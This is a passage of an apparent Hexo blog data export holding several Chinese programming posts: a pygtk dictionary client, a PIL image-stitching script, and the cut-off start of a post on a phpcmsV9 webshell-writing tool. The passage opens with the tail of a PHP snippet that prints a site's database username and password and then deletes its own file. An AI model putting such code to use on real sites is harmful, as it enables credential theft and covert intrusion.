class=\"string\">\"n\"</span>;</div><div class=\"line\"> <span class=\"variable\">$out</span> .=<span class=\"string\">'UserName:'</span>. <span class=\"variable\">$database</span>[<span class=\"string\">'default'</span>][<span class=\"string\">'username'</span>].<span class=\"string\">\"n\"</span>;</div><div class=\"line\"> <span class=\"variable\">$out</span> .=<span class=\"string\">'Password:'</span>. <span class=\"variable\">$database</span>[<span class=\"string\">'default'</span>][<span class=\"string\">'password'</span>].<span class=\"string\">\"n\"</span>;</div><div class=\"line\"> <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$database</span>)){</div><div class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"string\">\"Found it! :nn\"</span>;</div><div class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"variable\">$out</span>;</div><div class=\"line\"> }</div><div class=\"line\"> @unlink(<span class=\"string\">'expDatabase.php'</span>);</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n","_id":"fkot7nez588egus5","comments":true,"layout":"post","photos":[],"link":""},{"title":"python+pygtk+api写的一个简单的词典","id":273,"date":1352610894000,"tags":[],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>最见看看gtk的资料顺便练练手，就顺手写个词典玩玩，十来分钟的事情～～</p>\n<p>python越用越觉得顺手，简洁。不到50行代码就完成了，代码没有精简，要不然更短小～</p>\n<p>查询是调用爱词霸的接口：<a href=\"http://dict-co.iciba.com/api/dictionary.php?w=\" target=\"_blank\" rel=\"external\">http://dict-co.iciba.com/api/dictionary.php?w=</a> 接口地址后面跟</p>\n<p>查询的词汇</p>\n<p>返回的是xml数值。里面附带所有信息，包括发音 的声音文件地址，如果想带发音的功能</p>\n<p>可以直接使用它的文件，返回数值接口信息截图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-1.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-1.png\" alt=\"QQ20131106-1\"></a></p>\n<a id=\"more\"></a>\n\n<p>截图：<br><a href=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-2.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-2.png\" alt=\"QQ20131106-2\"></a></p>\n<p>查询结果：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-3.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-3.png\" alt=\"QQ20131106-3\"></a></p>\n<p>代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\">#coding: utf-8 </span></div><div class=\"line\"><span class=\"comment\">#Autor: return Blog:www.creturn.com Date:2012.11.11</span></div><div class=\"line\"><span class=\"keyword\">import</span> gtk,urllib</div><div class=\"line\"><span class=\"keyword\">from</span> xml.dom <span class=\"keyword\">import</span> minidom</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">init</span><span class=\"params\">()</span>:</span></div><div class=\"line\">        <span class=\"keyword\">global</span> bufferText </div><div class=\"line\">        <span class=\"keyword\">global</span> inputText</div><div class=\"line\">        win = gtk.Window()</div><div class=\"line\">        win.set_title(<span class=\"string\">'我的词典'</span>)</div><div class=\"line\">        win.connect(<span class=\"string\">'destroy'</span>,<span class=\"keyword\">lambda</span> w:gtk.main_quit())</div><div class=\"line\">        inputText = gtk.Entry()</div><div class=\"line\">        findBtn = gtk.Button(<span class=\"string\">'查询'</span>)</div><div class=\"line\">        viewText = gtk.TextView()</div><div class=\"line\">        inputText.connect(<span class=\"string\">'key-press-event'</span>,bindingKeys)</div><div class=\"line\">        hbox = gtk.HBox()</div><div class=\"line\">        vbox = gtk.VBox()</div><div class=\"line\">        scroll = gtk.ScrolledWindow()</div><div class=\"line\">        scroll.add(viewText)</div><div class=\"line\">        bufferText = gtk.TextBuffer()</div><div class=\"line\">        findBtn.connect(<span class=\"string\">'clicked'</span>,findWordEvent)</div><div class=\"line\">        viewText.set_buffer(bufferText)</div><div class=\"line\">        viewText.set_size_request(<span class=\"number\">200</span>,<span class=\"number\">200</span>)</div><div class=\"line\">        viewText.set_wrap_mode(gtk.WRAP_WORD_CHAR)</div><div class=\"line\">        hbox.set_size_request(<span class=\"number\">200</span>,<span class=\"number\">30</span>)</div><div class=\"line\">        hbox.pack_start(inputText,<span class=\"keyword\">False</span>)</div><div class=\"line\">        hbox.pack_start(findBtn,<span class=\"keyword\">False</span>)</div><div class=\"line\">        vbox.pack_start(hbox)</div><div class=\"line\">        vbox.pack_start(scroll)</div><div class=\"line\">        win.add(vbox)</div><div class=\"line\">        win.show_all()</div><div class=\"line\">        gtk.main()</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">bindingKeys</span><span class=\"params\">(widget,keyval)</span>:</span></div><div class=\"line\">                <span class=\"comment\"># print keyval</span></div><div class=\"line\">                <span class=\"keyword\">if</span> keyval.keyval == <span class=\"number\">65293</span>:</div><div class=\"line\">                        findWordEvent(<span class=\"keyword\">None</span>, <span class=\"keyword\">None</span>)</div><div class=\"line\"></div><div class=\"line\">         </div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">findWordEvent</span><span class=\"params\">(widget,data=None)</span>:</span></div><div class=\"line\">        bufferText.set_text(<span class=\"string\">'正在查询...'</span>)</div><div class=\"line\">        word = inputText.get_text()</div><div class=\"line\">        xml = get_word_translate(word)</div><div class=\"line\">        bufferText.set_text(<span class=\"string\">''</span>)</div><div class=\"line\">        doc = minidom.parseString(xml)</div><div class=\"line\">        dicList = doc.getElementsByTagName(<span class=\"string\">'acceptation'</span>)</div><div class=\"line\">        <span class=\"keyword\">if</span> len(dicList):</div><div class=\"line\">                <span class=\"keyword\">for</span> dic <span class=\"keyword\">in</span> dicList:</div><div class=\"line\">                        bufferText.insert_at_cursor(dic.childNodes[<span class=\"number\">0</span>].nodeValue)</div><div class=\"line\">        <span class=\"keyword\">else</span>:</div><div class=\"line\">                bufferText.insert_at_cursor(<span class=\"string\">'查无此词'</span>)</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_word_translate</span><span class=\"params\">(word)</span>:</span></div><div class=\"line\">        urlApi = <span class=\"string\">'http://dict-co.iciba.com/api/dictionary.php?w=%s'</span>%word</div><div class=\"line\">        result = urllib.urlopen(urlApi).read()</div><div class=\"line\">        <span class=\"keyword\">return</span> result</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">        init()</div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">        main()</div></pre></td></tr></table></figure>\n\n<p>github: <a href=\"https://github.com/creturn/workSnippet-python/blob/master/dict/main.py\" title=\"https://github.com/creturn/workSnippet-python/blob/master/dict/main.py\" target=\"_blank\" rel=\"external\">https://github.com/creturn/workSnippet-python/blob/master/dict/main.py</a></p>\n","source":"_posts/pythonpygtkapi写的一个简单的词典.md","raw":"title: \"python+pygtk+api写的一个简单的词典\"\nid: 273\ndate: 2012-11-11 13:14:54\ntags: \ncategories: \n- 原创作品\n- 技术文章\n---\n\n最见看看gtk的资料顺便练练手，就顺手写个词典玩玩，十来分钟的事情～～\n\npython越用越觉得顺手，简洁。不到50行代码就完成了，代码没有精简，要不然更短小～\n\n查询是调用爱词霸的接口：http://dict-co.iciba.com/api/dictionary.php?w= 接口地址后面跟\n\n查询的词汇\n\n返回的是xml数值。里面附带所有信息，包括发音 的声音文件地址，如果想带发音的功能\n\n可以直接使用它的文件，返回数值接口信息截图：\n\n[![QQ20131106-1](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-1.png)](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-1.png)\n\n<!--more-->\n\n截图：\n[![QQ20131106-2](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-2.png)](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-2.png)\n\n查询结果：\n\n[![QQ20131106-3](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-3.png)](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-3.png)\n\n代码\n\n```python\n#!/usr/bin/env python\n#coding: utf-8 \n#Autor: return Blog:www.creturn.com Date:2012.11.11\nimport gtk,urllib\nfrom xml.dom import minidom\ndef init():\n        global bufferText \n        global inputText\n        win = gtk.Window()\n        win.set_title('我的词典')\n        win.connect('destroy',lambda w:gtk.main_quit())\n        inputText = gtk.Entry()\n        findBtn = gtk.Button('查询')\n        viewText = gtk.TextView()\n        inputText.connect('key-press-event',bindingKeys)\n        hbox = gtk.HBox()\n        vbox = gtk.VBox()\n        scroll = gtk.ScrolledWindow()\n        scroll.add(viewText)\n        bufferText = gtk.TextBuffer()\n        findBtn.connect('clicked',findWordEvent)\n        viewText.set_buffer(bufferText)\n        viewText.set_size_request(200,200)\n        viewText.set_wrap_mode(gtk.WRAP_WORD_CHAR)\n        hbox.set_size_request(200,30)\n        hbox.pack_start(inputText,False)\n        hbox.pack_start(findBtn,False)\n        vbox.pack_start(hbox)\n        vbox.pack_start(scroll)\n        win.add(vbox)\n        win.show_all()\n        gtk.main()\ndef bindingKeys(widget,keyval):\n                # print keyval\n                if keyval.keyval == 65293:\n                        findWordEvent(None, None)\n\n         \ndef findWordEvent(widget,data=None):\n        bufferText.set_text('正在查询...')\n        word = inputText.get_text()\n        xml = get_word_translate(word)\n        bufferText.set_text('')\n        doc = minidom.parseString(xml)\n        dicList = doc.getElementsByTagName('acceptation')\n        if len(dicList):\n                for dic in dicList:\n                        bufferText.insert_at_cursor(dic.childNodes[0].nodeValue)\n        else:\n                bufferText.insert_at_cursor('查无此词')\ndef get_word_translate(word):\n        urlApi = 'http://dict-co.iciba.com/api/dictionary.php?w=%s'%word\n        result = urllib.urlopen(urlApi).read()\n        return result\ndef main():\n        init()\nif __name__ == '__main__':\n        main()\n```\n\ngithub: [https://github.com/creturn/workSnippet-python/blob/master/dict/main.py](https://github.com/creturn/workSnippet-python/blob/master/dict/main.py \"https://github.com/creturn/workSnippet-python/blob/master/dict/main.py\")\n","slug":"pythonpygtkapi写的一个简单的词典","updated":1421659126000,"excerpt":"<p>最见看看gtk的资料顺便练练手，就顺手写个词典玩玩，十来分钟的事情～～</p>\n<p>python越用越觉得顺手，简洁。不到50行代码就完成了，代码没有精简，要不然更短小～</p>\n<p>查询是调用爱词霸的接口：<a href=\"http://dict-co.iciba.com/api/dictionary.php?w=\" target=\"_blank\" rel=\"external\">http://dict-co.iciba.com/api/dictionary.php?w=</a> 接口地址后面跟</p>\n<p>查询的词汇</p>\n<p>返回的是xml数值。里面附带所有信息，包括发音 的声音文件地址，如果想带发音的功能</p>\n<p>可以直接使用它的文件，返回数值接口信息截图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-1.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-1.png\" alt=\"QQ20131106-1\"></a></p>\n","_id":"7o0fcqugk1cj641a","comments":true,"layout":"post","photos":[],"link":""},{"title":"Python拼接图片","id":290,"date":1363066933000,"tags":["a05ws7ypnelwdyuo"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>貌似这是13年第一次写文章了。好吧，去年主要写一些安全方面的文章，今年就把技术文章也加进来，已做笔记（其实天天用evenote）。</p>\n<p>人常说，不偷懒的程序员不是好程序员。今天有个任务比较麻烦，当然这个还不是我自己的任务。其实是美工的，不过一个团队，能帮</p>\n<p>点尽量帮点忙。神马任务呢？就是游戏的图场景已经被地图编辑器分割成300×300像素的小图。然后部门经理要美工吧图都拼成大图以便</p>\n<p>修改方便…100多场景，每个场景里面至少150张小图，任你美工技术多牛叉，我想没一个星期是弄不来的。</p>\n<p>So 就帮妹子一把~。~</p>\n<a id=\"more\"></a>\n\n<p>废话不多说的直接开始，先看看目录结构和图片的结构：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-4.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-4.png\" alt=\"QQ20131106-4\"></a></p>\n<p>其实分析小图，和对比里面的small我发现图片命名规则是pic后面一个数字是分割的列数，下划线后面的则是坐在行数</p>\n<p>并且每张小图都是300×300</p>\n<p>这样的话我自己的处理思路是这样的：</p>\n<p>首先，分析文件提取出行数和列数，然后计算原图的大小。</p>\n<p>然后不管用哪种语言，只要支持图片处理的就基本可以做。新建一个原图大小的画布，或者空的图片。</p>\n<p>最后根据行列位置填充相应的小图就拼接出来原图了。自己虽然做php的，但更偏爱python来处理小事情。so…上码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;pre title=&quot;&quot;&gt;<span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\">#coding: utf-8</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> PIL.Image <span class=\"keyword\">as</span> Image</div><div class=\"line\"><span class=\"keyword\">import</span> os</div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ImageUtil</span>:</span></div><div class=\"line\"> <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self,path)</span>:</span></div><div class=\"line\"> <span class=\"comment\"># 小图宽度</span></div><div class=\"line\"> self.sizeX = <span class=\"number\">300</span></div><div class=\"line\"> <span class=\"comment\"># 小图高度</span></div><div class=\"line\"> self.sizeY = <span class=\"number\">300</span></div><div class=\"line\"> <span class=\"comment\"># 高度有多少行</span></div><div class=\"line\"> self.sizeH = <span class=\"number\">0</span></div><div class=\"line\"> <span class=\"comment\"># 高度有多少列</span></div><div class=\"line\"> self.sizeW = <span class=\"number\">0</span></div><div class=\"line\"> <span class=\"comment\">#拼接图片存放位置</span></div><div class=\"line\"> self.imageDirPath = path</div><div class=\"line\"> <span class=\"comment\"># 拼接后图片的总宽度</span></div><div class=\"line\"> self.toImageWidth = <span class=\"number\">0</span></div><div class=\"line\"> <span class=\"comment\"># 拼接后图片的总高度</span></div><div class=\"line\"> self.toImageHeight = <span class=\"number\">0</span></div><div class=\"line\"> <span class=\"comment\"># 拼接图片后存放的位置</span></div><div class=\"line\"> self.toImageSavePath = <span class=\"string\">''</span></div><div class=\"line\"> <span class=\"comment\"># 获取需要转换成大图的图片大小</span></div><div class=\"line\"> <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getToImageSize</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\"> tmpX = <span class=\"number\">0</span></div><div class=\"line\"> tmpY = <span class=\"number\">0</span></div><div class=\"line\"> imgList = os.listdir(self.imageDirPath)</div><div class=\"line\"> tmpList = []</div><div class=\"line\"> <span class=\"comment\"># 过滤出目标文件</span></div><div class=\"line\"> <span class=\"keyword\">for</span> img <span class=\"keyword\">in</span> imgList:</div><div class=\"line\"> <span class=\"keyword\">if</span> img.find(<span class=\"string\">'pic'</span>) == <span class=\"number\">0</span>:</div><div class=\"line\"> <span class=\"comment\"># 分割文件名</span></div><div class=\"line\"> tmpList.append(img.replace(<span class=\"string\">'pic'</span>,<span class=\"string\">''</span>).replace(<span class=\"string\">'.jpg'</span>,<span class=\"string\">''</span>).split(<span class=\"string\">'_'</span>))</div><div class=\"line\"> <span class=\"comment\"># 计算行和列</span></div><div class=\"line\"> <span class=\"keyword\">for</span> size <span class=\"keyword\">in</span> tmpList:</div><div class=\"line\"> <span class=\"keyword\">if</span> int(size[<span class=\"number\">1</span>]) &gt; tmpY:</div><div class=\"line\"> tmpY = int(size[<span class=\"number\">1</span>])</div><div class=\"line\"> <span class=\"keyword\">if</span> int(size[<span class=\"number\">0</span>]) &gt; tmpX:</div><div class=\"line\"> tmpX = int(size[<span class=\"number\">0</span>])</div><div class=\"line\"> self.sizeH = tmpY</div><div class=\"line\"> self.sizeW = tmpX</div><div class=\"line\"> <span class=\"comment\"># 计算目标大图长宽</span></div><div class=\"line\"> self.toImageWidth = self.sizeX * (tmpX - <span class=\"number\">1</span>)</div><div class=\"line\"> self.toImageHeight = self.sizeY * (tmpY -<span class=\"number\">1</span>)</div><div class=\"line\"> <span class=\"keyword\">return</span> self</div><div class=\"line\"> <span class=\"comment\"># 开始转换</span></div><div class=\"line\"> <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">convert</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\"> toImage = Image.new(<span class=\"string\">'RGBA'</span>,(self.toImageWidth,self.toImageHeight))</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> xrange(<span class=\"number\">0</span>,self.sizeH - <span class=\"number\">1</span>):</div><div class=\"line\"> <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> xrange(<span class=\"number\">0</span>,self.sizeW - <span class=\"number\">1</span>):</div><div class=\"line\"> fname = <span class=\"string\">'pic%s_%s.jpg'</span>%(x,y)</div><div class=\"line\"> fname = self.imageDirPath + <span class=\"string\">'/'</span> + fname</div><div class=\"line\"> fromImage = Image.open(fname)</div><div class=\"line\"> toImage.paste(fromImage,(x*self.sizeX,y*self.sizeY))</div><div class=\"line\"> <span class=\"comment\"># print fromImage.size</span></div><div class=\"line\"></div><div class=\"line\">toImage.save(<span class=\"string\">'./save_1001.jpg'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">pass</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\"> path = <span class=\"string\">'./front_1001'</span></div><div class=\"line\"> imgUtl = ImageUtil(path)</div><div class=\"line\"> imgUtl.getToImageSize().convert()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">pass</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\"> main()&lt;/pre&gt;</div></pre></td></tr></table></figure>\n\n<p>运行后会根据指定目录分析文件后，最后拼接城一个大图。</p>\n<p>合成后的图片大小：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-5.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-5.png\" alt=\"QQ20131106-5\"></a></p>\n<p>嘿嘿，还是python好用</p>\n","source":"_posts/python拼接图片.md","raw":"title: \"Python拼接图片\"\nid: 290\ndate: 2013-03-12 13:42:13\ntags: \n- python\ncategories: \n- 原创作品\n- 技术文章\n---\n\n貌似这是13年第一次写文章了。好吧，去年主要写一些安全方面的文章，今年就把技术文章也加进来，已做笔记（其实天天用evenote）。\n\n人常说，不偷懒的程序员不是好程序员。今天有个任务比较麻烦，当然这个还不是我自己的任务。其实是美工的，不过一个团队，能帮\n\n点尽量帮点忙。神马任务呢？就是游戏的图场景已经被地图编辑器分割成300×300像素的小图。然后部门经理要美工吧图都拼成大图以便\n\n修改方便…100多场景，每个场景里面至少150张小图，任你美工技术多牛叉，我想没一个星期是弄不来的。\n\nSo 就帮妹子一把~。~\n\n<!--more-->\n\n废话不多说的直接开始，先看看目录结构和图片的结构：\n\n[![QQ20131106-4](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-4.png)](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-4.png)\n\n其实分析小图，和对比里面的small我发现图片命名规则是pic后面一个数字是分割的列数，下划线后面的则是坐在行数\n\n并且每张小图都是300×300\n\n这样的话我自己的处理思路是这样的：\n\n首先，分析文件提取出行数和列数，然后计算原图的大小。\n\n然后不管用哪种语言，只要支持图片处理的就基本可以做。新建一个原图大小的画布，或者空的图片。\n\n最后根据行列位置填充相应的小图就拼接出来原图了。自己虽然做php的，但更偏爱python来处理小事情。so…上码\n\n```python\n&lt;pre title=&quot;&quot;&gt;#!/usr/bin/env python\n#coding: utf-8\n\nimport PIL.Image as Image\nimport os\nclass ImageUtil:\n def __init__(self,path):\n # 小图宽度\n self.sizeX = 300\n # 小图高度\n self.sizeY = 300\n # 高度有多少行\n self.sizeH = 0\n # 高度有多少列\n self.sizeW = 0\n #拼接图片存放位置\n self.imageDirPath = path\n # 拼接后图片的总宽度\n self.toImageWidth = 0\n # 拼接后图片的总高度\n self.toImageHeight = 0\n # 拼接图片后存放的位置\n self.toImageSavePath = ''\n # 获取需要转换成大图的图片大小\n def getToImageSize(self):\n tmpX = 0\n tmpY = 0\n imgList = os.listdir(self.imageDirPath)\n tmpList = []\n # 过滤出目标文件\n for img in imgList:\n if img.find('pic') == 0:\n # 分割文件名\n tmpList.append(img.replace('pic','').replace('.jpg','').split('_'))\n # 计算行和列\n for size in tmpList:\n if int(size[1]) &gt; tmpY:\n tmpY = int(size[1])\n if int(size[0]) &gt; tmpX:\n tmpX = int(size[0])\n self.sizeH = tmpY\n self.sizeW = tmpX\n # 计算目标大图长宽\n self.toImageWidth = self.sizeX * (tmpX - 1)\n self.toImageHeight = self.sizeY * (tmpY -1)\n return self\n # 开始转换\n def convert(self):\n toImage = Image.new('RGBA',(self.toImageWidth,self.toImageHeight))\n\nfor y in xrange(0,self.sizeH - 1):\n for x in xrange(0,self.sizeW - 1):\n fname = 'pic%s_%s.jpg'%(x,y)\n fname = self.imageDirPath + '/' + fname\n fromImage = Image.open(fname)\n toImage.paste(fromImage,(x*self.sizeX,y*self.sizeY))\n # print fromImage.size\n\ntoImage.save('./save_1001.jpg')\n\npass\n\ndef main():\n path = './front_1001'\n imgUtl = ImageUtil(path)\n imgUtl.getToImageSize().convert()\n\npass\n\nif __name__ == '__main__':\n main()&lt;/pre&gt;\n```\n\n运行后会根据指定目录分析文件后，最后拼接城一个大图。\n\n合成后的图片大小：\n\n[![QQ20131106-5](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-5.png)](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-5.png)\n\n嘿嘿，还是python好用\n","slug":"python拼接图片","updated":1421659126000,"excerpt":"<p>貌似这是13年第一次写文章了。好吧，去年主要写一些安全方面的文章，今年就把技术文章也加进来，已做笔记（其实天天用evenote）。</p>\n<p>人常说，不偷懒的程序员不是好程序员。今天有个任务比较麻烦，当然这个还不是我自己的任务。其实是美工的，不过一个团队，能帮</p>\n<p>点尽量帮点忙。神马任务呢？就是游戏的图场景已经被地图编辑器分割成300×300像素的小图。然后部门经理要美工吧图都拼成大图以便</p>\n<p>修改方便…100多场景，每个场景里面至少150张小图，任你美工技术多牛叉，我想没一个星期是弄不来的。</p>\n<p>So 就帮妹子一把~。~</p>\n","_id":"1mh71caugci7e1d6","comments":true,"layout":"post","photos":[],"link":""},{"title":"Python版 phpcmsV9自动写shell工具","id":190,"date":1344360078000,"tags":["qvyaixa0ffh607ss","a05ws7ypnelwdyuo"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>最近一直在学习python相关内容就顺手写个工具以作练习，上代码：</p>\n<blockquote>\n<p>注意：本程序具有攻击性，请勿用作非法用途，否则于本作者无关！</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div 